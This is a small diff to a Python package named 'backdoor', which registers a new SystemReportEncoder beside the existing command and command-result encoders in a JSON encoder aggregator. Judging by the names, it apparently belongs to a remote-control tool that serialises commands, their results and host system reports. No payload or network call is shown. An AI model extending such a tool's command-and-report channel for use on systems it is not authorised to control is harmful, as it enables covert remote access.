@@ -7,11 +7,16 @@ from backdoor.serialization.encoders.commands import (
 )
 from backdoor.serialization.encoders.encoder import Encoder
 from backdoor.serialization.encoders.exceptions import NotEncodableError
+from backdoor.serialization.encoders.systemreport import SystemReportEncoder
 
 
 class EncoderAggregator(JSONEncoder):
 
-    encoders: Sequence[Encoder] = (CommandEncoder(), CommandResultEncoder())
+    encoders: Sequence[Encoder] = (
+        CommandEncoder(),
+        CommandResultEncoder(),
+        SystemReportEncoder(),
+    )
 
     def default(self, o: Any) -> Any:
         for encoder in self.encoders:
